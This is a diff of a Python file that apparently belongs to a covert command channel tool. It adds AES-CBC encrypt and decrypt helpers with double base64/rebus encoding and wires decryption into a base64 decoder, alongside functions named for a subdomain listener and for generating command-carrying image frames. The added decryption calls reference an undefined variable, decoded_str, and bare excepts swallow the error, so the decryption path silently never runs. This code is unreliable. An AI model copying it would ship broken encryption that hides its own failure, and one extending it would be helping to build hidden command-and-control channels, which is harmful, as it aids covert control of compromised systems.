@@ -14,19 +14,62 @@ import os
 import config
 
 
+def aes_decrypt(encrypted_message, aes_key, aes_iv):
+	rebus_decoded = rebus.b64decode(encrypted_message.encode('utf-8'))
+	encrypted_message = base64.b64decode(rebus_decoded)
+	BS = 16
+	unpad = lambda s: s[:-s[-1]]
+	aes_key_bytes = str.encode(aes_key)
+	iv_bytes = str.encode(aes_iv)
+	cipher = AES.new(aes_key_bytes, AES.MODE_CBC, iv_bytes)
+	raw = cipher.decrypt(encrypted_message)
+	message = unpad(raw).decode('utf-8')
+	return message
+
+
+def aes_encrypt(message, aes_key, aes_iv):
+	message = message.encode()
+	BS = 16
+	pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode()
+	raw = pad(message)
+	aes_key_bytes = str.encode(aes_key)
+	iv_bytes = str.encode(aes_iv)
+	cipher = AES.new(aes_key_bytes, AES.MODE_CBC, iv_bytes)
+	enc = cipher.encrypt(raw)
+	rebus_encoded = rebus.b64encode(base64.b64encode(enc).decode('utf-8'))
+	return rebus_encoded.decode("utf-8")
+
+
 def decode_base64(encoded_str):
+	aes_key = config.aes_key
+	aes_iv =  config.aes_iv
 	try:
 		decoded_string = base64.b64decode(encoded_str).decode("utf-8")
+		try:
+			decrypted_str = aes_decrypt(decoded_str, aes_key, aes_iv)
+			return decrypted_str
+		except:
+			pass
 		return decoded_string
 	except:
 		pass
 	try:
 		decoded_string = base64.b64decode(encoded_str+"=").decode("utf-8")
+		try:
+			decrypted_str = aes_decrypt(decoded_str, aes_key, aes_iv)
+			return decrypted_str
+		except:
+			pass
 		return decoded_string
 	except:
 		pass
 	try:
 		decoded_string = base64.b64decode(encoded_str+"==").decode("utf-8")
+		try:
+			decrypted_str = aes_decrypt(decoded_str, aes_key, aes_iv)
+			return decrypted_str
+		except:
+			pass
 		return decoded_string
 	except:
 		pass
@@ -87,19 +130,6 @@ def listener(ns_subdomain, log_file):
 			break
 
 		server.close()
-
-
-def aes_encrypt(message, aes_key, aes_iv):
-	message = message.encode()
-	BS = 16
-	pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode()
-	raw = pad(message)
-	aes_key_bytes = str.encode(aes_key)
-	iv_bytes = str.encode(aes_iv)
-	cipher = AES.new(aes_key_bytes, AES.MODE_CBC, iv_bytes)
-	enc = cipher.encrypt(raw)
-	rebus_encoded = rebus.b64encode(base64.b64encode(enc).decode('utf-8'))
-	return rebus_encoded.decode("utf-8")
 
 
 def generate_frames(image_type, command, aes_key, aes_iv):
